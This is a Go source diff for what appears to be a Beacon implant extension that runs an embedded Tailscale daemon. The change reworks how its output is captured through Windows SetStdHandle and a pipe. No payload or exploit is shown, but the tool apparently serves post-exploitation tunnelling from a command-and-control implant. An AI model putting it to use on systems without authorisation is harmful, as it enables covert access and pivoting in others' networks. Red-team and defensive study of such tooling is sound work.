@@ -13,15 +13,25 @@ import "C"
 import (
 	"fmt"
 	"io"
-	"log"
 	"os"
 	"strings"
 	"sync"
+	"syscall"
 
 	"github.com/google/uuid"
 )
 
-// beaconWriter sends output to BeaconOutput
+var (
+	setStdHandle = kernel32.NewProc("SetStdHandle")
+	getStdHandle = kernel32.NewProc("GetStdHandle")
+)
+
+const (
+	STD_OUTPUT_HANDLE = ^uint32(10) + 1 // -11 & 0xFFFFFFFF
+	STD_ERROR_HANDLE  = ^uint32(11) + 1 // -12 & 0xFFFFFFFF
+)
+
+// Custom writer that sends to BeaconOutput
 type beaconWriter struct {
 	mu sync.Mutex
 }
@@ -48,49 +58,94 @@ func BeaconPrintf(format string, args ...interface{}) {
 	}
 }
 
-func setupRedirection() (originalStdout *os.File, originalStderr *os.File, originalLogOutput io.Writer) {
+func setupRedirection() (originalStdout *os.File, originalStderr *os.File, originalStdoutHandle syscall.Handle, originalStderrHandle syscall.Handle, pipeRead *os.File, pipeWrite *os.File) {
+	// Get the original stdout and stderr handles
+	stdoutHandle, _, _ := getStdHandle.Call(uintptr(STD_OUTPUT_HANDLE))
+	originalStdoutHandle = syscall.Handle(stdoutHandle)
+
+	stderrHandle, _, _ := getStdHandle.Call(uintptr(STD_ERROR_HANDLE))
+	originalStderrHandle = syscall.Handle(stderrHandle)
+
+	// Save original os.Stdout and os.Stderr
 	originalStdout = os.Stdout
 	originalStderr = os.Stderr
-	originalLogOutput = log.Writer()
 
-	w := &beaconWriter{}
-	// Create an os.File backed by a pipe whose read end is consumed by beaconWriter.
-	// This lets code that writes directly to os.Stdout/os.Stderr (via the *os.File)
-	// get captured too, not just fmt.Fprint/log calls.
-	pr, pw, _ := os.Pipe()
-	go func() {
-		buf := make([]byte, 4096)
-		for {
-			n, err := pr.Read(buf)
-			if n > 0 {
-				w.Write(buf[:n])
-			}
-			if err != nil {
-				return
-			}
-		}
-	}()
+	// Create a pipe
+	r, w, _ := os.Pipe()
+	pipeRead = r
+	pipeWrite = w
 
-	os.Stdout = pw
-	os.Stderr = pw
-	log.SetOutput(w)
+	// Get the write end's handle
+	writeHandle := syscall.Handle(w.Fd())
+
+	// Set both Windows stdout and stderr handles to our pipe's write end
+	setStdHandle.Call(uintptr(STD_OUTPUT_HANDLE), uintptr(writeHandle))
+	setStdHandle.Call(uintptr(STD_ERROR_HANDLE), uintptr(writeHandle))
+
+	// Also redirect Go's os.Stdout and os.Stderr
+	os.Stdout = w
+	os.Stderr = w
 
 	return
 }
 
-func restoreRedirection(originalStdout *os.File, originalStderr *os.File, originalLogOutput io.Writer) {
-	// Close the pipe write ends so the reader goroutines exit
-	os.Stdout.Close()
-	os.Stderr = originalStderr
-	os.Stdout = originalStdout
-	log.SetOutput(originalLogOutput)
+func restoreRedirection(originalStdout *os.File, originalStderr *os.File, originalStdoutHandle syscall.Handle, originalStderrHandle syscall.Handle, pipeWrite *os.File) {
+	// Restore Windows stdout and stderr handles
+	setStdHandle.Call(uintptr(STD_OUTPUT_HANDLE), uintptr(originalStdoutHandle))
+	setStdHandle.Call(uintptr(STD_ERROR_HANDLE), uintptr(originalStderrHandle))
+
+	// Restore Go's os.Stdout and os.Stderr
+	if originalStdout != nil {
+		os.Stdout = originalStdout
+	}
+	if originalStderr != nil {
+		os.Stderr = originalStderr
+	}
+
+	// Close the write end of the pipe
+	if pipeWrite != nil {
+		pipeWrite.Close()
+	}
+}
+
+func captureOutput(r *os.File, done chan bool) {
+	writer := &beaconWriter{}
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			select {
+			case <-done:
+				return
+			default:
+				n, err := r.Read(buf)
+				if err != nil {
+					if err != io.EOF {
+						return
+					}
+					return
+				}
+				if n > 0 {
+					writer.Write(buf[:n])
+				}
+			}
+		}
+	}()
 }
 
 //export Go
 func Go(data *C.char, length C.int) {
-	// Redirect os.Stdout, os.Stderr, and log output to BeaconOutput
-	originalStdout, originalStderr, originalLogOutput := setupRedirection()
-	defer restoreRedirection(originalStdout, originalStderr, originalLogOutput)
+	// Setup redirection
+	originalStdout, originalStderr, originalStdoutHandle, originalStderrHandle, pipeRead, pipeWrite := setupRedirection()
+	done := make(chan bool)
+
+	// Start capturing output
+	captureOutput(pipeRead, done)
+
+	// Ensure restoration happens before returning
+	defer func() {
+		close(done)
+		restoreRedirection(originalStdout, originalStderr, originalStdoutHandle, originalStderrHandle, pipeWrite)
+	}()
 
 	var parser C.datap
 	C.BeaconDataParse(&parser, data, length)
@@ -139,14 +194,8 @@ func Go(data *C.char, length C.int) {
 		BeaconPrintf("[=] No socket provided, using random socket %s\n", socket)
 	}
 
-	//This stops tailscaled creating an empty folder at C:\ProgramData\tailscale
 	os.Setenv("TS_LOGS_DIR", "C:\\ProgramData")
-	//This will force RFC6455 compliant websocket connections for tunneling DERP relay and control plane connections
 	os.Setenv("TS_DEBUG_DERP_WS_CLIENT", "1")
-	//Raise logtail's stderr echo level so [v1]/info messages are captured via the pipe
-	os.Setenv("TS_LOG_VERBOSITY", "1")
 	os.Args = tokens
 	main()
-
-	BeaconPrintf("tailscaled shutdown gracefully\n")
 }
